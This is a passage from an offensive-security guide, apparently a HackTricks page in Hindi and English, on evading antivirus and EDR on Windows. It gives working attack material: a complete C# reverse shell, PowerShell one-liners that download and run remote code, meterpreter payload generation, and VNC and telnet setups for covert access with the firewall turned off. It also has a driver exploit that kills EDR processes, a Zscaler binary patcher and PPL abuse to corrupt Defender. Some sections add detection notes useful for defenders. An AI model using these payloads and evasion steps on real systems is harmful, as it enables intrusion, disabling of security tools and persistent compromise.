**MoTW** (Mark of The Web) एक [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) है जिसका नाम Zone.Identifier है और यह इंटरनेट से फ़ाइलें डाउनलोड करने पर स्वचालित रूप से बनता है, साथ ही उस URL को भी रिकॉर्ड करता है जहाँ से फ़ाइल डाउनलोड की गई थी।

<figure><img src="../images/image (237).png" alt=""><figcaption><p>इंटरनेट से डाउनलोड की गई फ़ाइल के लिए Zone.Identifier ADS की जाँच।</p></figcaption></figure>

> [!TIP]
> यह ध्यान देने योग्य है कि executables जो किसी **trusted** signing certificate से signed होते हैं, **won't trigger SmartScreen**।

payloads को Mark of The Web मिलने से रोकने का एक बहुत प्रभावी तरीका है उन्हें किसी कंटेनर जैसे ISO के अंदर पैकेज करना। ऐसा इसलिए होता है क्योंकि Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes।

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) एक टूल है जो payloads को output containers में पैकेज करता है ताकि Mark-of-the-Web से बचा जा सके।

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) Windows का एक शक्तिशाली लॉगिंग तंत्र है जो applications और सिस्टम कंपोनेंट्स को घटनाओं को **log events** करने की अनुमति देता है। हालांकि, इसे security products द्वारा malicious गतिविधियों की निगरानी और detection के लिए भी प्रयोग किया जा सकता है।

जैसे AMSI को disable (bypass) किया जाता है, वैसे ही यह भी संभव है कि user space process के **`EtwEventWrite`** फ़ंक्शन को तुरंत return कर दिया जाए बिना किसी इवेंट को लॉग किए। यह फ़ंक्शन को memory में patch करके किया जाता है ताकि वह तुरंत return कर दे, जिससे उस प्रोसेस के लिए ETW logging effectively disable हो जाती है।

You can find more info in **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Loading C# binaries in memory काफी समय से जाना जाता है और यह अभी भी आपके post-exploitation tools को AV से पकड़े बिना चलाने का एक शानदार तरीका है।

क्योंकि payload सीधे memory में load होगा बिना disk को छुए, हमें पूरे process के लिए AMSI patching की चिंता ही करनी होगी।

Most C2 frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) पहले से ही C# assemblies को सीधे memory में execute करने की क्षमता प्रदान करते हैं, लेकिन इसे करने के अलग-अलग तरीके होते हैं:

- **Fork\&Run**

यह एक नया sacrificial process spawn करने, आपके post-exploitation malicious code को उस नए process में inject करने, आपका malicious code execute करने और जब पूरा हो जाए तो नए process को kill करने को शामिल करता है। इसके फायदे और नुकसान दोनों हैं। Fork and run method का फायदा यह है कि execution हमारे Beacon implant process के बाहर होता है। इसका अर्थ है कि अगर हमारे post-exploitation action में कुछ गलत होता है या पकड़ा जाता है, तो हमारी implant के बचने का अवसर काफी अधिक रहता है। नुक़सान यह है कि आपको Behavioural Detections द्वारा पकड़े जाने का अधिक मौका मिल सकता है।

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

यह अपने ही process में post-exploitation malicious code को inject करने के बारे में है। इस तरह आप एक नया process create कर उसे AV द्वारा scan करवाने से बच सकते हैं, लेकिन नुकसान यह है कि अगर आपके payload के execution में कुछ गलत हो जाता है, तो आपकी beacon खोने का बहुत अधिक खतरा होता है क्योंकि वह crash कर सकता है।

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> यदि आप C# Assembly loading के बारे में और पढ़ना चाहते हैं, तो कृपया इस article को देखें [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) और उनका InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

You can also load C# Assemblies **from PowerShell**, देखिए [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) और [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Using Other Programming Languages

जैसा कि प्रस्तावित है [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), यह संभव है कि अन्य भाषाओं का उपयोग करके malicious code execute किया जाए यदि compromised machine को attacker controlled SMB share पर installed interpreter environment तक access दिया जाए।

SMB share पर Interpreter Binaries और environment तक access की अनुमति देकर आप compromised machine की memory में इन भाषाओं में **execute arbitrary code in these languages within memory** कर सकते हैं।

Repo में कहा गया है: Defender अब भी scripts को scan करता है लेकिन Go, Java, PHP आदि का उपयोग करके हमारे पास **static signatures को bypass करने की अधिक flexibility** होती है। इन भाषाओं में random un-obfuscated reverse shell scripts के साथ testing सफल रही है।

## TokenStomping

Token stomping एक तकनीक है जो एक attacker को अनुमति देती है कि वह **access token या किसी security product जैसे EDR या AV** को manipulate करे, जिससे वे उसकी privileges कम कर सकें ताकि process न मरे पर उसके पास malicious गतिविधियों की जांच करने की permissions न रहें।

इसे रोकने के लिए Windows external processes को security processes के tokens पर handles प्राप्त करने से रोक सकता है।

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

जैसा कि इस ब्लॉग पोस्ट में वर्णित है [**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide), यह आसान है कि आप केवल Chrome Remote Desktop को पीड़ित की मशीन पर deploy करें और फिर इसे takeover और persistence बनाए रखने के लिए उपयोग करें:
1. https://remotedesktop.google.com/ से डाउनलोड करें, "Set up via SSH" पर क्लिक करें, और फिर Windows के लिए MSI फ़ाइल डाउनलोड करने के लिए MSI फाइल पर क्लिक करें।
2. इंस्टॉलर को victim पर silently चलाएँ (admin आवश्यक): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop पेज पर वापस जाएँ और अगले पर क्लिक करें। विज़ार्ड फिर आपसे authorize करने के लिए कहेगा; जारी रखने के लिए Authorize बटन पर क्लिक करें।
4. दिए गए parameter को कुछ समायोजन के साथ execute करें: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (ध्यान दें pin parameter जो GUI का उपयोग किए बिना pin सेट करने की अनुमति देता है)。


## Advanced Evasion

Evasion एक बहुत जटिल विषय है, कभी-कभी आपको एक ही सिस्टम में कई अलग-अलग telemetry sources को ध्यान में रखना पड़ता है, इसलिए mature environments में पूरी तरह से undetected रह पाना लगभग असंभव होता है।

हर environment जिसके खिलाफ आप जाते हैं, उसकी अपनी मजबूती और कमजोरियाँ होंगी।

मैं दृढ़ता से सुझाव देता हूँ कि आप [@ATTL4S](https://twitter.com/DaniLJ94) की यह talk देखें, ताकि Advanced Evasion techniques के बारे में अधिक समझ मिले।


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

यह एक और बेहतरीन talk है [@mariuszbit](https://twitter.com/mariuszbit) से, जो Evasion in Depth के बारे में है।


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

आप [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) का उपयोग कर सकते हैं जो बाइनरी के हिस्सों को तब तक remove करेगा जब तक यह पता न चल जाए कि Defender किस हिस्से को malicious मान रहा है और उसे आपके लिए अलग कर देगा।\
एक और टूल जो ऐसा ही करता है वह है [**avred**](https://github.com/dobin/avred) जिसका एक ओपन वेब सर्विस है [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Until Windows10, सभी Windows में एक **Telnet server** आता था जिसे आप administrator के रूप में install कर सकते थे करके:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
इसे सिस्टम शुरू होने पर **शुरू** करें और इसे अभी **चलाएँ**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port बदलें** (stealth) और firewall को अक्षम करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (you want the bin downloads, not the setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- विकल्प _Disable TrayIcon_ सक्षम करें
- _VNC Password_ में पासवर्ड सेट करें
- _View-Only Password_ में पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नई** बनाई गई फाइल _**UltraVNC.ini**_ को **victim** के अंदर रखें

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. Then, inside the **victim**: Start the winvnc daemon `winvnc.exe -run` and run `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** छुपाव बनाए रखने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- `winvnc` को तब शुरू न करें जब वह पहले से चल रहा हो, वरना एक [popup](https://i.imgur.com/1SROTTl.png) ट्रिगर होगा। यह चल रहा है या नहीं जांचने के लिए `tasklist | findstr winvnc` का उपयोग करें
- उसी डायरेक्टरी में `UltraVNC.ini` के बिना `winvnc` शुरू न करें वरना [the config window](https://i.imgur.com/rfMQWcf.png) खुल जाएगी
- मदद के लिए `winvnc -h` न चलाएँ वरना एक [popup](https://i.imgur.com/oc18wcu.png) ट्रिगर होगा

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT के अंदर:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब `msfconsole -r file.rc` के साथ **lister शुरू करें** और **xml payload** को **execute** करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान defender प्रक्रिया को बहुत जल्दी समाप्त कर देगा।**

### हमारे अपने reverse shell का कम्पाइल करना

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# Revershell

इसे कम्पाइल करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे इसके साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using संकलक
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# ऑबफ़स्केटर्स की सूची: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### build injectors बनाने के लिए python का उपयोग — उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space से AV/EDR को निष्क्रिय करना

Storm-2603 ने रैनसमवेयर डालने से पहले एंडपॉइंट सुरक्षा को निष्क्रिय करने के लिए एक छोटा कंसोल यूटिलिटी जिसे **Antivirus Terminator** कहा जाता है, का उपयोग किया। यह टूल अपना **own vulnerable but *signed* driver** लाता है और इसका दुरुपयोग करते हुए ऐसे привिलेज्ड kernel ऑपरेशंस जारी करता है जिन्हें Protected-Process-Light (PPL) AV सेवाएँ भी ब्लॉक नहीं कर पातीं।

मुख्य निष्कर्ष
1. **Signed driver**: डिस्क पर डिलीवर की गई फाइल `ServiceMouse.sys` है, लेकिन बाइनरी असल में Antiy Labs के “System In-Depth Analysis Toolkit” का वैध रूप से साइन किया हुआ ड्राइवर `AToolsKrnl64.sys` है। क्योंकि ड्राइवर पर Microsoft का वैध सिग्नेचर है, यह Driver-Signature-Enforcement (DSE) चालू होने पर भी लोड हो जाता है।
2. सेवा इंस्टॉलेशन:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
पहली लाइन ड्राइवर को एक **kernel service** के रूप में रजिस्टर करती है और दूसरी लाइन इसे स्टार्ट करती है ताकि `\\.\ServiceMouse` user land से एक्सेसेबल हो जाए।
3. ड्राइवर द्वारा एक्सपोज़ किए गए IOCTLs
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | किसी भी PID द्वारा arbitrary प्रोसेस को terminate करना (Defender/EDR सेवाओं को मारने के लिए उपयोग किया जाता है) |
| `0x990000D0` | डिस्क पर किसी भी arbitrary फाइल को delete करना |
| `0x990001D0` | ड्राइवर को unload करना और सेवा को हटाना |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. क्यों काम करता है: BYOVD user-mode सुरक्षा को पूरी तरह स्किप कर देता है; kernel में चलने वाला कोड *protected* प्रक्रियाओं को खोल सकता है, उन्हें terminate कर सकता है, या kernel ऑब्जेक्ट्स के साथ छेड़छाड़ कर सकता है, चाहे PPL/PP, ELAM या अन्य हार्डनिंग फीचर मौजूद हों।

Detection / Mitigation
• Microsoft के vulnerable-driver block list (`HVCI`, `Smart App Control`) को सक्षम करें ताकि Windows `AToolsKrnl64.sys` को लोड करने से मना कर दे।  
• नए *kernel* services के निर्माण की निगरानी करें और अलर्ट करें जब कोई ड्राइवर world-writable डायरेक्टरी से लोड हो या allow-list में मौजूद न हो।  
• कस्टम device ऑब्जेक्ट्स के लिए user-mode हैंडल और उसके बाद संदिग्ध `DeviceIoControl` कॉल्स पर नज़र रखें।

### Zscaler Client Connector के Posture Checks को On-Disk Binary Patching के जरिए बायपास करना

Zscaler का **Client Connector** device-posture नियमों को लोकली लागू करता है और परिणामों को अन्य कंपोनेंट्स तक संप्रेषित करने के लिए Windows RPC पर निर्भर रहता है। दो कमजोर डिज़ाइन निर्णय एक पूर्ण बायपास को संभव बनाते हैं:

1. Posture मूल्यांकन पूरी तरह client-side होता है (एक boolean सर्वर को भेजा जाता है)।  
2. Internal RPC endpoints केवल यह सत्यापित करते हैं कि कनेक्ट कर रहा executable **Zscaler द्वारा साइन** किया गया है (via `WinVerifyTrust`)।

डिस्क पर चार signed binaries को पैच करके दोनों मेकैनिज्म को निष्क्रिय किया जा सकता है:

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | हमेशा `1` रिटर्न करता है, इसलिए हर चेक compliant माना जाता है |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ कोई भी (यहाँ तक कि unsigned) प्रक्रिया RPC pipes से bind कर सकती है |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Replaced by `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Tunnel पर integrity checks | बायपास कर दिए गए |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
मूल फ़ाइलों को प्रतिस्थापित करने और सर्विस स्टैक को रीस्टार्ट करने के बाद:

* **All** posture checks **green/compliant** दिखाते हैं।
* Unsigned या modified binaries named-pipe RPC endpoints खोल सकते हैं (e.g. `\\RPC Control\\ZSATrayManager_talk_to_me`)।
* संक्रमित होस्ट को Zscaler नीतियों द्वारा परिभाषित आंतरिक नेटवर्क तक अनियंत्रित पहुँच मिल जाती है।

यह केस स्टडी दिखाती है कि कैसे केवल client-side trust निर्णय और सरल signature checks कुछ byte patches से पराजित किए जा सकते हैं।

## Abusing Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) एक signer/level hierarchy लागू करता है ताकि केवल समान-या-ऊंचे protected processes ही एक-दूसरे में छेड़छाड़ कर सकें। Offensive रूप से, यदि आप वैध रूप से एक PPL-enabled binary लॉन्च कर सकते हैं और उसके arguments नियंत्रित कर सकते हैं, तो आप benign functionality (e.g., logging) को एक constrained, PPL-backed write primitive में बदल सकते हैं जो AV/EDR द्वारा उपयोग किए जाने वाले protected directories के खिलाफ काम करता है।

What makes a process run as PPL
- The target EXE (and any loaded DLLs) must be signed with a PPL-capable EKU.
- The process must be created with CreateProcess using the flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- A compatible protection level must be requested that matches the signer of the binary (e.g., `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` for anti-malware signers, `PROTECTION_LEVEL_WINDOWS` for Windows signers). Wrong levels will fail at creation.

See also a broader intro to PP/PPL and LSASS protection here:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (selects protection level and forwards arguments to the target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- साइन किए गए सिस्टम बाइनरी `C:\Windows\System32\ClipUp.exe` खुद को स्पॉन करता है और कॉलर-निर्दिष्ट पाथ पर लॉग फ़ाइल लिखने के लिए एक पैरामीटर स्वीकार करता है।
- जब इसे एक PPL प्रक्रिया के रूप में लॉन्च किया जाता है, तो फ़ाइल लिखना PPL बैकिंग के साथ होता है।
- ClipUp स्पेस वाले पाथ्स को पार्स नहीं कर सकता; सामान्यतः संरक्षित लोकेशन्स की ओर इशारा करने के लिए 8.3 short paths का उपयोग करें।

8.3 short path helpers
- शॉर्ट नाम सूचीबद्ध करें: हर parent directory में `dir /x` चलाएँ।
- cmd में शॉर्ट पाथ निकालें: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) PPL-capable LOLBIN (ClipUp) को `CREATE_PROTECTED_PROCESS` के साथ किसी लॉन्चर का उपयोग कर लॉन्च करें (उदा., CreateProcessAsPPL)।
2) ClipUp के log-path आर्ग्यूमेंट को पास करें ताकि एक फ़ाइल protected AV directory (उदा., Defender Platform) में बनाई जा सके। आवश्यकता होने पर 8.3 short names का उपयोग करें।
3) यदि टार्गेट बाइनरी सामान्यतः AV द्वारा चलाते समय ओपन/लॉक रहती है (उदा., MsMpEng.exe), तो AV के शुरू होने से पहले बूट पर लिखाई शेड्यूल करने के लिए एक auto-start service इंस्टॉल करें जो भरोसेमंद रूप से पहले चले। बूट ऑर्डरिंग को Process Monitor (boot logging) से वेरिफाई करें।
4) रिबूट पर PPL-backed write, AV के बाइनरीज़ को लॉक करने से पहले होता है, जिससे टार्गेट फ़ाइल करप्ट हो जाती है और स्टार्टअप रोका जा सकता है।

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- आप ClipUp द्वारा लिखी जाने वाली सामग्री को स्थान के अलावा नियंत्रित नहीं कर सकते; यह primitive सटीक कंटेंट इंजेक्शन के बजाय करप्शन के लिए अनुकूल है।
- सेवा इंस्टॉल/स्टार्ट करने और रिबूट विंडो के लिए local admin/SYSTEM आवश्यक है।
- समय-सारिणी महत्वपूर्ण है: लक्ष को खुला नहीं होना चाहिए; बूट-टाइम اجرा फ़ाइल लॉक से बचता है।

Detections
- असामान्य आर्गुमेंट्स के साथ `ClipUp.exe` का प्रोसेस निर्माण, विशेषकर गैर-मानक लॉन्चर्स द्वारा पैरेंट किए जाने पर, बूट के आसपास।
- नए सर्विसेस जो संदिग्ध बाइनरीज़ को auto-start करने के लिए कॉन्फ़िगर हैं और लगातार Defender/AV से पहले शुरू हो रहे हैं। Defender स्टार्टअप विफलताओं से पहले की गई सर्विस क्रिएशन/मॉडिफिकेशन की जाँच करें।
- Defender बाइनरीज़/Platform डायरेक्टरीज़ पर फाइल इंटीग्रिटी मॉनिटरिंग; protected-process फ्लैग्स वाले प्रोसेसेस द्वारा अनपेक्षित फ़ाइल क्रिएशन/मॉडिफिकेशन।
- ETW/EDR telemetry: `CREATE_PROTECTED_PROCESS` के साथ बनाए गए प्रोसेसेस और non-AV बाइनरीज़ द्वारा असामान्य PPL स्तर के उपयोग की तलाश करें।

Mitigations
- WDAC/Code Integrity: सीमित करें कि कौन से साइन किए गए बाइनरी PPL के रूप में चल सकते हैं और किन parents के तहत; legitimate contexts के बाहर ClipUp invocation को ब्लॉक करें।
- सर्विस हाइजीन: auto-start सेवाओं के निर्माण/संशोधन को प्रतिबंधित करें और स्टार्ट-ऑर्डर में मैनिपुलेशन की निगरानी करें।
- सुनिश्चित करें कि Defender tamper protection और early-launch protections सक्षम हैं; बाइनरी करप्शन सूचित करने वाली स्टार्टअप त्रुटियों की जाँच करें।
- यदि आपके वातावरण के अनुकूल हो तो security tooling होस्ट करने वाले वॉल्यूम्स पर 8.3 short-name generation को अक्षम करने पर विचार करें (ठीक से परीक्षण करें)।

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender उस प्लेटफ़ॉर्म का चयन करता है जिससे वह चलता है, निम्न के अंतर्गत सबफ़ोल्डर्स को enumerate करके:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

